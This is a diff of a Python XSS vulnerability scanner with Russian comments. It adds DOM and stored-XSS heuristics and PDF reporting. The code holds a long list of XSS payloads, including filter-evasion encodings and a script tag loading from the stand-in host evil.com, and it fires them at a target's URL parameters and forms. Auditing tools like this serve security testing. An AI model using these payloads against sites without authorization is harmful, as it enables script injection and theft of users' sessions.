@@ -1,4 +1,3 @@
-
 import requests
 import sys
 import time
@@ -16,16 +15,16 @@ import os
 
 try:
     from reportlab.lib.pagesizes import A4
-    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
+    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
     from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
     from reportlab.lib import colors
     from reportlab.lib.enums import TA_CENTER, TA_LEFT
     from reportlab.pdfbase import pdfmetrics
     from reportlab.pdfbase.ttfonts import TTFont
-
     PDF_SUPPORT = True
 except ImportError:
     PDF_SUPPORT = False
+
 class XSSAuditor:
     def __init__(self, target_url, max_threads=10, cookies=None, headers=None):
         """Специализированный XSS-сканер
@@ -34,21 +33,21 @@ class XSSAuditor:
         cookies (dict): Куки для аутентификации
         headers (dict): Заголовки HTTP"""
         self.target_url = target_url.rstrip('/')
-        parsed_url =urlparse(target_url)
-        self.base_domain= parsed_url.netloc
+        parsed_url = urlparse(target_url)
+        self.base_domain = parsed_url.netloc
         self.scheme = parsed_url.scheme or 'http'
-        self.max_threads =max_threads
-        self.session =requests.Session()
-        default_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        self.max_threads = max_threads
+        self.session = requests.Session()
+        default_headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
             'Connection': 'keep-alive',
-            'Referer': target_url,}
-
+            'Referer': target_url,
+        }
         if headers:
             default_headers.update(headers)
         self.session.headers.update(default_headers)
-
         self.vulnerabilities = []
         self.stats = {
             'start_time': time.time(),
@@ -66,6 +65,16 @@ class XSSAuditor:
         print(f"Инициализирован XSS-сканер для: {self.target_url}")
         print(f"Загружено XSS-векторов: {len(self.xss_payloads)}")
 
+    def _safe_request(self, method, url, **kwargs):
+        """Безопасная отправка запроса с подсчетом"""
+        try:
+            response = self.session.request(method, url, timeout=10, **kwargs)
+            self.stats['requests_sent'] += 1
+            return response
+        except requests.RequestException as e:
+            print(f"Ошибка запроса к {url}: {e}")
+            return None
+
     def _load_comprehensive_xss_payloads(self):
         """Загрузка полного набора XSS векторов"""
         payloads = []
@@ -75,17 +84,14 @@ class XSSAuditor:
             '<script>alert(1)</script>',
             '<img src=x onerror=alert("XSS")>',
             '""><img src=x onerror=alert(1)>',
-
             '<script>alert(document.cookie)</script>',
             '<script>alert(window.location)</script>',
             '<script>prompt("XSS")</script>',
             '<script>confirm("XSS")</script>',
-
             '<img src="javascript:alert(\'XSS\')">',
             '<img src=x onerror=alert(1)>',
             '<img src=x onmouseover=alert(1)>',
             '<img src=x onload=alert(1)>',
-
             '<svg onload=alert(1)>',
             '<svg/onload=alert("XSS")>',
             '<svg><script>alert(1)</script></svg>',
@@ -101,23 +107,21 @@ class XSSAuditor:
             ' onload=alert(1)',
             ' onerror=alert(1)',
             ' onclick=alert(1)',
-
             'javascript:alert("XSS")',
             'jav&#x61;script:alert("XSS")',
             'JaVaScRiPt:alert("XSS")',
-            'data:text/html,<script>alert("XSS")</script>',
+            'text/html,<script>alert("XSS")</script>',
         ]
         payloads.extend(attribute_payloads)
+
         print("Загрузка полиморфных векторов")
         polymorphic_payloads = [
             '<scr<script>ipt>alert(1)</scr</script>ipt>',
             '<scr\x00ipt>alert(1)</scr\x00ipt>',
             '<scr\x0Aipt>alert(1)</scr\x0Aipt>',
-
             '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
             '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
             '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
-
             '<ScRiPt>alert(1)</ScRiPt>',
             '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
             '<IMG SRC=JaVaScRiPt:alert("XSS")>',
@@ -130,15 +134,12 @@ class XSSAuditor:
             '<body onload=alert(1)>',
             '<body onunload=alert(1)>',
             '<body onpageshow=alert(1)>',
-
             '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
             '<iframe src=javascript:alert(1)>',
             '<frame src=javascript:alert(1)>',
-
             '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
             '<button onmouseover=alert(1)>Click</button>',
             '<select onfocus=alert(1)><option>test</option></select>',
-
             '<audio src=x onerror=alert(1)>',
             '<video src=x onerror=alert(1)>',
             '<video><source onerror=alert(1)></video>',
@@ -179,17 +180,14 @@ class XSSAuditor:
             '</script><script>alert(1)</script><script>',
             '<script>alert(1)//</script>',
             '<script>alert(1)/*/</script>',
-
             'onclick=alert(1)',
             'onclick = alert(1)',
             'onclick =alert(1)',
             'onclick= alert(1)',
-
             'javascript&colon;alert(1)',
             'javascript&#58;alert(1)',
             'javascript&#0058;alert(1)',
             'javascript&#x3a;alert(1)',
-
             '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
             '&amp;lt;script&amp;gt;alert(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;',
         ]
@@ -202,37 +200,32 @@ class XSSAuditor:
             '\';alert(1);//',
             '";alert(1);//',
             '`;alert(1);//',
-
             'background:javascript:alert(1)',
             'background:url(javascript:alert(1))',
             'expression(alert(1))',
-            '-moz-binding:url("data:text/xml,<xml>...</xml>")',
-
+            '-moz-binding:url("text/xml,<xml>...</xml>")',
             'javascript://%0Aalert(1)',
             'javascript://%0D%0Aalert(1)',
             'javascript://comment%0Aalert(1)',
         ]
         payloads.extend(context_payloads)
+
         unique_payloads = list(dict.fromkeys(payloads))
         return unique_payloads
 
     def full_xss_scan(self):
         """Полное сканирование на XSS уязвимости"""
-        print("\n" + "=" * 70)
         print("Начало сканирования XSS")
         print(f"Цель: {self.target_url}")
         print(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        print("=" * 70 + "\n")
 
         try:
             print("Разведка сайта")
             print("Получение главной страницы")
-
             main_response = self._safe_request('GET', self.target_url)
             if not main_response or main_response.status_code != 200:
                 print(f"Ошибка доступа к сайту (код: {main_response.status_code if main_response else 'нет ответа'})")
                 return self.vulnerabilities
-
             self.stats['pages_scanned'] += 1
             main_content = main_response.text
 
@@ -240,7 +233,6 @@ class XSSAuditor:
             page_info = self._analyze_page(main_content)
 
             print("\nПоиск точек ввода")
-
             forms = self._find_all_forms(main_content)
             self.stats['forms_found'] = len(forms)
             print(f"Найдено форм: {len(forms)}")
@@ -253,7 +245,6 @@ class XSSAuditor:
             print(f"Найдено источников JavaScript: {len(js_sources)}")
 
             print("\nXSS тестирование")
-
             if param_urls:
                 print("Тестирование URL параметров")
                 url_results = self._test_url_parameters(param_urls)
@@ -266,6 +257,15 @@ class XSSAuditor:
                 self.vulnerabilities.extend(form_results)
                 self.stats['reflected_xss'] += len([v for v in form_results if 'Reflected' in v['type']])
 
+            #поиск потенциальных DOM и Stored XSS
+            dom_results = self._scan_for_dom_xss(main_content, js_sources)
+            self.vulnerabilities.extend(dom_results)
+            self.stats['dom_xss_potential'] += len([v for v in dom_results if 'DOM-based' in v['type']])
+
+            stored_results = self._find_stored_xss_potential(forms)
+            self.vulnerabilities.extend(stored_results)
+            self.stats['stored_xss_potential'] += len([v for v in stored_results if 'Stored' in v['type']])
+
             self.stats['vulnerabilities_found'] = len(self.vulnerabilities)
             self.stats['parameters_tested'] = self._calculate_parameters_tested()
 
@@ -274,12 +274,14 @@ class XSSAuditor:
             return self.vulnerabilities
         except Exception as e:
             print(f"Ошибка при сканировании: {e}")
+            import traceback
+            traceback.print_exc() #трассировка для отладки
             return self.vulnerabilities
 
         #Вывод результатов
         self._print_results_summary()
-
         return self.vulnerabilities
+
     def _analyze_page(self, html_content):
         """Анализ HTML страницы"""
         info = {
@@ -290,7 +292,6 @@ class XSSAuditor:
             'scripts_count': 0,
             'technology_hints': []
         }
-
         try:
             #Заголовок
             title_match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
@@ -303,25 +304,33 @@ class XSSAuditor:
             info['links_count'] = len(re.findall(r'<a [^>]*href=', html_content, re.IGNORECASE))
             info['scripts_count'] = len(re.findall(r'<script', html_content, re.IGNORECASE))
 
+            #Определение технологий
             tech_patterns = {
-                'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
-                'Joomla': ['joomla', 'media/jui'],
-                'Drupal': ['drupal', 'sites/all'],
-                'React': ['react', 'react-dom', '__NEXT_DATA__'],
-                'Vue.js': ['vue', 'vue.js', '__vue__'],
-                'Angular': ['ng-', 'angular'],
-                'jQuery': ['jquery', '$\.'],
-                'Bootstrap': ['bootstrap', 'btn-'],
-                'PHP': ['\.php', 'php'],
-                'ASP.NET': ['\.aspx', 'asp.net', '__VIEWSTATE'],
+                'WordPress': [r'wp-content', r'wp-includes', r'wordpress'],
+                'Joomla': [r'joomla', r'media/jui'],
+                'Drupal': [r'drupal', r'sites/all'],
+                'React': [r'react', r'react-dom', r'__NEXT_DATA__'],
+                'Vue.js': [r'vue', r'vue\.js', r'__vue__'],
+                'Angular': [r'ng-', r'angular'],
+
+                'jQuery': [r'jquery', r'\$\.' ],
+                'Bootstrap': [r'bootstrap', r'btn-'],
+
+                'PHP': [r'\.php', r'php'],
+
+                'ASP.NET': [r'\.aspx', r'asp\.net', r'__VIEWSTATE'],
             }
 
             for tech, patterns in tech_patterns.items():
+                found_tech = False
                 for pattern in patterns:
+                    #Используем re.IGNORECASE для каждого паттерна
                     if re.search(pattern, html_content, re.IGNORECASE):
-                        if tech not in info['technology_hints']:
-                            info['technology_hints'].append(tech)
-                        break
+                        found_tech = True
+                        break  #Если один из паттернов совпал переход к следующей технологии
+                if found_tech and tech not in info['technology_hints']:
+                    info['technology_hints'].append(tech)
+
 
             print(f"Заголовок: {info['title']}")
             print(f"Формы: {info['forms_count']}, Поля: {info['inputs_count']}")
@@ -337,11 +346,16 @@ class XSSAuditor:
     def _find_all_forms(self, html_content):
         """Поиск всех форм на странице"""
         forms = []
+        try:
+            from bs4 import BeautifulSoup
+            BS4_SUPPORT = True
+        except ImportError:
+            BS4_SUPPORT = False
+
         if BS4_SUPPORT:
             try:
                 soup = BeautifulSoup(html_content, 'html.parser')
                 form_elements = soup.find_all('form')
-
                 for form_idx, form in enumerate(form_elements):
                     form_data = {
                         'id': form_idx,
@@ -352,7 +366,6 @@ class XSSAuditor:
                         'selects': [],
                         'html': str(form)[:500]
                     }
-
                     if form_data['action']:
                         if form_data['action'].startswith('http'):
                             form_data['full_action'] = form_data['action']
@@ -387,26 +400,21 @@ class XSSAuditor:
                             })
 
                     forms.append(form_data)
-
             except Exception as e:
                 print(f"Ошибка BeautifulSoup: {e}")
                 forms = self._find_forms_regex(html_content)
         else:
             forms = self._find_forms_regex(html_content)
-
         return forms
 
     def _find_forms_regex(self, html_content):
         """Поиск форм с помощью fallback"""
         forms = []
-
         form_matches = re.findall(r'<form[^>]*>(.*?)</form>', html_content, re.IGNORECASE | re.DOTALL)
-
         for form_idx, form_html in enumerate(form_matches):
             try:
                 action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                 method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
-
                 form_data = {
                     'id': form_idx,
                     'action': action_match.group(1) if action_match else '',
@@ -428,11 +436,9 @@ class XSSAuditor:
                 #Поиск полей ввода
                 form_data['inputs'] = []
                 input_matches = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
-
                 for input_html in input_matches:
                     name_match = re.search(r'name=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                     type_match = re.search(r'type=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
-
                     if name_match:
                         form_data['inputs'].append({
                             'name': name_match.group(1),
@@ -441,10 +447,8 @@ class XSSAuditor:
                         })
 
                 forms.append(form_data)
-
             except Exception:
                 continue
-
         return forms
 
     def _find_all_urls(self, html_content):
@@ -454,7 +458,8 @@ class XSSAuditor:
             r'href=["\']([^"\']+)["\']',
             r'src=["\']([^"\']+)["\']',
             r'action=["\']([^"\']+)["\']',
-            r'url\(["\']?([^"\'\)]+)["\']?\)',]
+            r'url\(["\']?([^"\'\)]+)["\']?\)',
+        ]
         for pattern in patterns:
             matches = re.findall(pattern, html_content, re.IGNORECASE)
             for match in matches:
@@ -486,9 +491,9 @@ class XSSAuditor:
 
         #Встроенные скрипты
         inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.IGNORECASE | re.DOTALL)
-        for script in inline_scripts[:5]:
-            if len(script.strip()) > 10:
-                sources.add(f"inline:{script[:200]}")
+        for script in inline_scripts[:5]: # Ограничиваем количество анализируемых inline скриптов
+             if len(script.strip()) > 10:
+                 sources.add(f"inline:{script[:200]}")
 
         return list(sources)
 
@@ -496,13 +501,11 @@ class XSSAuditor:
         """Тестирование URL параметров на XSS"""
         vulnerabilities = []
         tested_urls = set()
-
-        #Ограничиваем количество URL для тестирования
+        # Ограничиваем количество URL для тестирования
         max_urls_to_test = min(50, len(urls))
         test_urls = urls[:max_urls_to_test]
 
         print(f"Тестируется {len(test_urls)} URL с параметрами")
-
         for url_idx, url in enumerate(test_urls, 1):
             if url_idx % 10 == 0:
                 print(f"Прогресс: {url_idx}/{len(test_urls)}")
@@ -511,17 +514,16 @@ class XSSAuditor:
                 parsed = urlparse(url)
                 if parsed.query:
                     query_params = parse_qs(parsed.query)
-
                     for param_name in query_params:
                         #Базовый URL без параметров
                         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-                        #с разными пейлоадами
-                        for payload_idx, payload in enumerate(self.xss_payloads[:15]):
-                            #тестовый запрос
+                        #тестовый запрос с разными пейлоадами
+                        for payload_idx, payload in enumerate(self.xss_payloads[:15]): # Уменьшаем количество пейлоадов для каждого параметра
+                            #тестовый параметр
                             test_params = {param_name: payload}
                             test_url = f"{base_url}?{urlencode(test_params)}"
-                            
-                            #отправление запроса
+
+                            #отправка запроса
                             response = self._safe_request('GET', test_url)
                             if not response:
                                 continue
@@ -537,25 +539,19 @@ class XSSAuditor:
                                     'response_code': response.status_code,
                                     'confidence': 'High',
                                     'description': f'Обнаружена reflected XSS уязвимость в параметре "{param_name}". Пейлоад отображается и выполняется в браузере.',
-                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
+                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                                }
                                 vulnerabilities.append(vuln)
-
                                 print(f"Найдена XSS: {param_name} в {parsed.path}")
-
-
                                 break
-
             except Exception as e:
                 print(f"Ошибка тестирования URL {url}: {e}")
                 continue
-
         return vulnerabilities
 
     def _test_forms_xss(self, forms):
         """Тестирование форм на XSS"""
         vulnerabilities = []
-
         print(f"Тестируем {len(forms)} форм")
 
         for form_idx, form in enumerate(forms, 1):
@@ -563,20 +559,18 @@ class XSSAuditor:
                 print(f"Прогресс форм: {form_idx}/{len(forms)}")
 
             try:
-                #только текстовые поля
+                #выбираем только текстовые поля
                 text_inputs = [
                     inp for inp in form['inputs']
-                    if inp['type'] in ['text', 'search', 'email', 'url', 'textarea', None]]
-
+                    if inp['type'] in ['text', 'search', 'email', 'url', 'textarea', None]
+                ]
                 if not text_inputs:
                     continue
 
-                #первое текстовое поле
+                #берем первое текстовое поле для теста
                 first_input = text_inputs[0]
-
-                #с разными пейлоадами
+                #тест с разными пейлоадами
                 for payload in self.xss_payloads[:10]:
-
                     form_data = {}
                     for inp in form['inputs']:
                         if inp['name']:
@@ -585,7 +579,7 @@ class XSSAuditor:
                             else:
                                 form_data[inp['name']] = 'test'
 
-                    #запрос
+                    #отправка запроса
                     if form['method'] == 'GET':
                         query_string = urlencode(form_data)
                         test_url = f"{form['full_action']}?{query_string}"
@@ -596,7 +590,7 @@ class XSSAuditor:
                     if not response:
                         continue
 
-                    #XSS
+                    #проверка на XSS
                     if self._is_xss_vulnerable(response, payload, 'FORM'):
                         vuln = {
                             'type': f'Reflected XSS (Form - {form["method"]})',
@@ -607,28 +601,22 @@ class XSSAuditor:
                             'response_code': response.status_code,
                             'confidence': 'High',
                             'description': f'Обнаружена XSS уязвимость в поле "{first_input["name"]}" формы. Пейлоад не фильтруется и выполняется в браузере.',
-                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
+                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                        }
                         if form['method'] == 'GET':
-                            vuln['url'] = f"{form['full_action']}?{first_input['name']}={quote(payload)}"
-
+                             vuln['url'] = f"{form['full_action']}?{first_input['name']}={quote(payload)}"
                         vulnerabilities.append(vuln)
-
                         print(f"Найдена XSS в форме: {first_input['name']}")
-                        break
-
+                        break # Прекращаем тестировать другие пейлоады для этого поля, если нашли уязвимость
             except Exception as e:
                 print(f"Ошибка тестирования формы: {e}")
                 continue
-
         return vulnerabilities
 
     def _scan_for_dom_xss(self, html_content, js_sources):
         """Поиск DOM-based XSS уязвимостей"""
         vulnerabilities = []
-
         print("Анализ на DOM-based XSS")
-
         try:
             #Поиск опасных JavaScript функций
             dangerous_functions = [
@@ -649,7 +637,8 @@ class XSSAuditor:
                         'confidence': 'Medium',
                         'description': f'Обнаружена потенциально опасная функция "{func}" которая может привести к DOM-based XSS.',
                         'recommendation': 'Используйте textContent вместо innerHTML, избегайте eval() и document.write()',
-                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    }
                     vulnerabilities.append(vuln)
 
             #обработчики событий с пользовательским вводом
@@ -657,7 +646,6 @@ class XSSAuditor:
                 'onload', 'onerror', 'onclick', 'onmouseover',
                 'onfocus', 'onblur', 'onchange', 'onsubmit',
                 'onkeydown', 'onkeypress', 'onkeyup',]
-
             for handler in event_handlers:
                 pattern = rf'{handler}=["\']([^"\']+)["\']'
                 matches = re.findall(pattern, html_content, re.IGNORECASE)
@@ -670,14 +658,14 @@ class XSSAuditor:
                             'confidence': 'Medium',
                             'description': f'Обнаружен обработчик события "{handler}" с потенциально опасным кодом.',
                             'recommendation': 'Валидируйте и экранируйте данные перед использованием в обработчиках событий',
-                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                        }
                         vulnerabilities.append(vuln)
 
             #из недоверенных источников
             url_sources = [
                 'location.hash', 'location.search', 'document.URL',
                 'document.referrer', 'window.name', 'document.cookie',]
-
             for source in url_sources:
                 if source in html_content:
                     vuln = {
@@ -686,20 +674,18 @@ class XSSAuditor:
                         'confidence': 'Low',
                         'description': f'Обнаружено использование непроверенного источника данных "{source}".',
                         'recommendation': 'Всегда валидируйте и экранируйте данные из непроверенных источников',
-                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    }
                     vulnerabilities.append(vuln)
 
         except Exception as e:
             print(f"Ошибка поиска DOM XSS: {e}")
-
         return vulnerabilities
 
     def _find_stored_xss_potential(self, forms):
         """Поиск потенциала для Stored XSS"""
         vulnerabilities = []
-
         print("Анализ на Stored XSS потенциал")
-
         try:
             #формы для комментариев, сообщений, отзывов
             keywords = ['comment', 'message', 'post', 'review', 'feedback',
@@ -709,10 +695,9 @@ class XSSAuditor:
                 for input_field in form['inputs']:
                     field_name = input_field['name'] or ''
                     field_lower = field_name.lower()
-
                     for keyword in keywords:
                         if keyword in field_lower:
-                            #тип поля
+                            # тип поля
                             if input_field['type'] in ['text', 'textarea', None]:
                                 vuln = {
                                     'type': 'Stored XSS (Potential)',
@@ -723,7 +708,8 @@ class XSSAuditor:
                                     'confidence': 'Low',
                                     'description': f'Обнаружено поле "{field_name}" (похоже на поле для контента) которое может быть уязвимо для Stored XSS.',
                                     'recommendation': 'Всегда экранируйте пользовательский контент перед сохранением в БД и перед выводом',
-                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                                }
                                 vulnerabilities.append(vuln)
                                 break
 
@@ -739,31 +725,30 @@ class XSSAuditor:
                             'confidence': 'Medium',
                             'description': f'Обнаружено текстовое поле "{textarea["name"]}" которое может быть уязвимо для Stored XSS.',
                             'recommendation': 'Всегда экранируйте содержимое textarea перед сохранением и выводом',
-                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                        }
                         vulnerabilities.append(vuln)
 
         except Exception as e:
             print(f"Ошибка поиска Stored XSS: {e}")
-
         return vulnerabilities
 
     def _is_xss_vulnerable(self, response, payload, source_type):
         """Определение XSS уязвимости по ответу"""
         if not response or response.status_code != 200:
             return False
-
         content = response.text
 
-        # есть ли пейлоад в ответе
+        #есть ли пейлоад в ответе
         payload_in_response = payload in content
 
-        # закодированные версии
+        #закодированные версии
         encoded_found = False
         encoded_versions = [
             quote(payload),
             payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
-            payload.replace('<', '%3C').replace('>', '%3E'), ]
-
+            payload.replace('<', '%3C').replace('>', '%3E'),
+        ]
         for encoded in encoded_versions:
             if encoded in content:
                 encoded_found = True
@@ -771,6 +756,7 @@ class XSSAuditor:
 
         if not payload_in_response and not encoded_found:
             return False
+
         escaped_payload = escape(payload)
         if escaped_payload in content:
             return False
@@ -781,22 +767,22 @@ class XSSAuditor:
             'onerror=', 'onload=', 'onmouseover=', 'onclick=', 'onfocus=',
             'javascript:', 'alert(', 'confirm(', 'prompt(',
             'document.', 'window.', 'location.',
-            'eval(', 'setTimeout(', 'setInterval(', ]
+            'eval(', 'setTimeout(', 'setInterval(',
+        ]
 
         for indicator in js_indicators:
             if indicator in content:
                 return True
 
-        #для определенных типов источников
+        #дополнительные проверки для определенных типов источников
         if source_type == 'URL':
-            #URL параметров ищем отражение в определенных контекстах
+            #для URL параметров ищем отражение в определенных контекстах
             contexts = [
                 f'>{payload}<',  #Внутри тегов
                 f'"{payload}"',  #Внутри атрибутов
                 f"'{payload}'",  #Внутри атрибутов с одинарными кавычками
                 f'={payload}',  #После знака равно
-]
-
+            ]
             for context in contexts:
                 if context in content:
                     return True
@@ -806,29 +792,21 @@ class XSSAuditor:
     def _calculate_parameters_tested(self):
         """Расчет количества протестированных параметров"""
         total = 0
-
-        #считаются URL параметры
         for vuln in self.vulnerabilities:
             if 'parameter' in vuln or 'vulnerable_field' in vuln:
                 total += 1
-
         return total
 
     def _print_results_summary(self):
         """Вывод сводки результатов"""
         duration = time.time() - self.stats['start_time']
-
-        print("\n" + "=" * 70)
         print("Результаты XSS Сканирования")
-        print("=" * 70)
-
         print(f"\nСтатистика:")
         print(f"Общее время: {duration:.2f} секунд")
         print(f"Отправлено запросов: {self.stats['requests_sent']}")
         print(f"Проверено страниц: {self.stats['pages_scanned']}")
         print(f"Найдено форм: {self.stats['forms_found']}")
         print(f"Протестировано параметров: {self.stats['parameters_tested']}")
-
         if duration > 0:
             speed = self.stats['requests_sent'] / duration
             print(f"  Скорость: {speed:.1f} запросов/сек")
@@ -846,13 +824,13 @@ class XSSAuditor:
                     vuln_type = vuln['type'].replace('Reflected XSS', 'XSS')
                     print(f"  {i}. {vuln_type}")
                     if 'parameter' in vuln:
-                        print(f"Параметр: {vuln['parameter']}")
+                        print(f"     Параметр: {vuln['parameter']}")
                     elif 'vulnerable_field' in vuln:
-                        print(f"Поле: {vuln['vulnerable_field']}")
+                        print(f"     Поле: {vuln['vulnerable_field']}")
                     if 'url' in vuln:
-                        print(f"URL: {vuln['url'][:80]}")
+                        print(f"     URL: {vuln['url'][:80]}")
 
-        # Оценка безопасности
+        #Оценка безопасности
         print(f"\nОценка Безопасности:")
         if self.stats['reflected_xss'] > 0:
             print("уровень безопасности: низкий")
@@ -863,141 +841,409 @@ class XSSAuditor:
         else:
             print("уровень безопасности: высокий")
             print("Критические XSS уязвимости не обнаружены")
+    def _setup_russian_fonts(self):
+        """Настройка русских шрифтов для PDF"""
+        try:
+            #Попытка использовать стандартный шрифт с поддержкой кириллицы
+            pdfmetrics.registerFont(TTFont('DejaVu', 'DejaVuSans.ttf'))
+            return True
+        except:
+            try:
+                #Альтернатива
+                font_paths = [
+                    '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf',
+                    '/usr/share/fonts/truetype/freefont/FreeSans.ttf',
+                    'C:\\Windows\\Fonts\\arial.ttf',
+                    'C:\\Windows\\Fonts\\times.ttf',
+                    '/System/Library/Fonts/Helvetica.ttc',
+                    '/Library/Fonts/Arial.ttf'
+                ]
+                for font_path in font_paths:
+                    if os.path.exists(font_path):
+                        pdfmetrics.registerFont(TTFont('RussianFont', font_path))
+                        return True
+                #Если не найден шрифты использует встроенные
+                print("Не удалось найти русские шрифты, используем стандартные")
+                return False
+            except:
+                return False
 
-        print("\n" + "=" * 70)
+    def generate_pdf_report(self, filename="xss_report.pdf"):
+        """Генерирует PDF отчет с поддержкой русского языка"""
+        print(f"\nГенерация PDF отчета: {filename}")
+        if not PDF_SUPPORT:
+             print("Библиотека 'reportlab' не установлена. PDF отчет не может быть создан.")
+             return
+
+        try:
+            #Настройка русских шрифтов
+            fonts_setup = self._setup_russian_fonts()
+
+            #документ
+            doc = SimpleDocTemplate(
+                filename,
+                pagesize=A4,
+                rightMargin=72,
+                leftMargin=72,
+                topMargin=72,
+                bottomMargin=72
+            )
+            #Стили с учетом русского языка
+            styles = getSampleStyleSheet()
+            #имя шрифта для использования
+            font_name = 'RussianFont' if fonts_setup else 'Helvetica'
+
+            #Кастомные стили с русским шрифтом
+            title_style = ParagraphStyle(
+                'CustomTitle',
+                parent=styles['Heading1'],
+                fontName=font_name,
+                fontSize=16,
+                spaceAfter=30,
+                alignment=TA_CENTER,
+                textColor=colors.HexColor('#2C3E50')
+            )
+            heading_style = ParagraphStyle(
+                'CustomHeading',
+                parent=styles['Heading2'],
+                fontName=font_name,
+                fontSize=14,
+                spaceAfter=12,
+                spaceBefore=12,
+                textColor=colors.HexColor('#2980B9')
+            )
+            subheading_style = ParagraphStyle(
+                'SubHeading',
+                parent=styles['Heading3'],
+                fontName=font_name,
+                fontSize=12,
+                spaceAfter=6,
+                spaceBefore=6,
+                textColor=colors.HexColor('#34495E')
+            )
+            #Стиль для обычного текста
+            normal_style = ParagraphStyle(
+                'NormalRussian',
+                parent=styles['Normal'],
+                fontName=font_name,
+                fontSize=10,
+                leading=14
+            )
+            #Стиль для таблиц
+            table_style = ParagraphStyle(
+                'TableRussian',
+                parent=styles['Normal'],
+                fontName=font_name,
+                fontSize=9,
+                leading=12
+            )
+
+            #Содержимое документа
+            story = []
+
+            #Заголовок
+            story.append(Paragraph("Отчет об аудите XSS уязвимостей", title_style))
+            story.append(Spacer(1, 20))
+
+            #Информация о сканировании
+            story.append(Paragraph("Информация о сканировании", heading_style))
+            scan_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            duration = time.time() - self.stats['start_time']
+            info_data = [
+                ['Параметр', 'Значение'],
+                ['Цель сканирования', self.target_url],
+                ['Домен', self.base_domain],
+                ['Дата сканирования', scan_date],
+                ['Общее время', f"{duration:.1f} секунд"],
+                ['Загружено XSS векторов', f"{len(self.xss_payloads)}"],
+                ['Отправлено запросов', str(self.stats['requests_sent'])],
+                ['Проверено страниц', str(self.stats['pages_scanned'])],
+                ['Найдено форм', str(self.stats['forms_found'])],
+                ['Протестировано параметров', str(self.stats['parameters_tested'])],
+                ['Найдено уязвимостей', str(self.stats['vulnerabilities_found'])]
+            ]
+
+            #создание таблицы с данными
+            table_data = []
+            for row in info_data:
+                table_row = []
+                for cell in row:
+                    table_row.append(Paragraph(str(cell), table_style))
+                table_data.append(table_row)
+
+            info_table = Table(table_data, colWidths=[200, 300])
+            info_table.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498DB')),
+                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
+                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                ('FONTNAME', (0, 0), (-1, 0), font_name if fonts_setup else 'Helvetica-Bold'),
+                ('FONTSIZE', (0, 0), (-1, 0), 12),
+                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
+                ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#EBF5FB')),
+                ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#D6EAF8'))
+            ]))
+            story.append(info_table)
+            story.append(Spacer(1, 20))
+
+            #Результаты сканирования
+            story.append(Paragraph("Результаты сканирования", heading_style))
+            story.append(Paragraph(f"Найдено уязвимостей: {len(self.vulnerabilities)}", subheading_style))
+
+            if self.vulnerabilities:
+                for i, vuln in enumerate(self.vulnerabilities, 1):
+                    story.append(Paragraph(f"Уязвимость #{i}: {vuln['type']}", subheading_style))
+                    vuln_data = [
+                        ['Параметр', 'Значение'],
+                        ['Тип', vuln['type']],
+                        ['Уверенность', vuln.get('confidence', 'Неизвестно')],
+                        ['Метод', vuln.get('method', 'N/A')],
+                        ['Код ответа', str(vuln.get('response_code', 'N/A'))],
+                        ['Описание', vuln.get('description', 'Нет')],
+                        ['Пейлоад', vuln.get('payload', 'N/A')[:100]], # Обрезаем пейлоад
